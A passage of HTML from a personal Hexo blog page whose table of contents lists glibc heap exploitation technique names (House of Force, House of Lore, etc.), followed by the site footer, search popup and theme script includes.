Of Einherjar</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#House-Of-Force"><span class="nav-text">House Of Force</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#House-of-Rabbit"><span class="nav-text">House of Rabbit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#House-of-Mind"><span class="nav-text">House of Mind</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#House-of-Corrosion"><span class="nav-text">House of Corrosion</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#House-of-Lore"><span class="nav-text">House of Lore</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#House-of-Storm"><span class="nav-text">House of Storm</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#House-of-Rust"><span class="nav-text">House of Rust</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#House-of-Crust"><span class="nav-text">House of Crust</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#House-of-Gods"><span class="nav-text">House of Gods</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#House-of-Banana"><span class="nav-text">House of Banana</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#House-of-Muney"><span class="nav-text">House of Muney</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#House-of-%E4%B8%80%E9%AA%91%E5%BD%93%E5%8D%83"><span class="nav-text">House of 一骑当千</span></a></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        27 posts in total
                    </span>
                    
                        <span>
                            396.5k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>